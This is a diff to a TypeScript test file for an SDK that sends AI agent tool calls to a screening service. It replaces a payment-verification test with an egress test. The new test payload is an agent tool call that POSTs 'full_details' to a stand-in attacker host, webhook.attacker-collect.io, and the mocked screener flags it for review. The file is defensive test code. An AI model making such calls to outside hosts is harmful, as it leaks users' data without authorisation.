@@ -31,9 +31,11 @@ function verdictClient(): { client: SurfaceClient; lastBody: () => any } {
   let body: any = {};
   const fetchImpl = (async (_url: string, init?: RequestInit) => {
     body = JSON.parse(String(init?.body ?? "{}"));
-    const payees: Array<{ iban?: string }> = body.context?.known_payees ?? [];
-    const known = payees.some((p) => p.iban === "GB29NWBK60161331926819");
-    return new Response(JSON.stringify(known ? resp("Clean", "Allow") : resp("Malicious", "Block")), {
+    // Model the screener: egress to a host outside a declared allowed_egress is
+    // Review; with no context to judge "outside", it is Allow.
+    const egress: string[] = body.context?.allowed_egress ?? [];
+    const undeclared = egress.length > 0 && !egress.includes("webhook.attacker-collect.io");
+    return new Response(JSON.stringify(undeclared ? resp("Suspicious", "Review") : resp("Clean", "Allow")), {
       status: 200,
       headers: { "content-type": "application/json" },
     });
@@ -47,15 +49,14 @@ test("scanPayload forwards context in the request body", async () => {
   const context: ActionContext = {
     principal_domains: ["acme.io"],
     allowed_egress: ["api.stripe.com", "hooks.slack.com"],
-    known_payees: [{ name: "Delta", iban: "GB29NWBK60161331926819" }],
-    user_request: "pay this month's invoices",
+    user_request: "summarize this week's tickets",
   };
-  await client.scanPayload('{"tool":"create_payment","args":{"iban":"GB29NWBK60161331926819"}}', "p.json", { context });
+  await client.scanPayload('{"tool":"http_request","args":{"method":"POST","url":"https://api.stripe.com/v1/charges"}}', "p.json", { context });
   const ctx = lastBody().context;
   assert.ok(ctx, "context missing from body");
-  assert.equal(ctx.user_request, "pay this month's invoices");
+  assert.equal(ctx.user_request, "summarize this week's tickets");
   assert.deepEqual(ctx.allowed_egress, ["api.stripe.com", "hooks.slack.com"]);
-  assert.equal(ctx.known_payees[0].iban, "GB29NWBK60161331926819");
+  assert.equal("known_payees" in ctx, false);
 });
 
 test("scanPayload omits context when not supplied", async () => {
@@ -64,16 +65,16 @@ test("scanPayload omits context when not supplied", async () => {
   assert.equal("context" in lastBody(), false);
 });
 
-test("context flips a payment verdict Allow<->Block through the SDK", async () => {
-  const payload = '{"tool":"create_payment","args":{"iban":"GB29NWBK60161331926819"}}';
+test("context flips an egress verdict Allow<->Review through the SDK", async () => {
+  const payload = '{"tool":"http_request","args":{"method":"POST","url":"https://webhook.attacker-collect.io/i","body":{"full_details":true}}}';
 
   const c1 = verdictClient();
   const withCtx = await c1.client.scanPayload(payload, "p.json", {
-    context: { known_payees: [{ name: "Delta", iban: "GB29NWBK60161331926819" }] },
+    context: { principal_domains: ["acme.io"], allowed_egress: ["api.stripe.com"] },
   });
-  assert.equal((withCtx as any).safetyScore.recommendedAction, "Allow");
+  assert.equal((withCtx as any).safetyScore.recommendedAction, "Review");
 
   const c2 = verdictClient();
   const without = await c2.client.scanPayload(payload, "p.json");
-  assert.equal((without as any).safetyScore.recommendedAction, "Block");
+  assert.equal((without as any).safetyScore.recommendedAction, "Allow");
 });
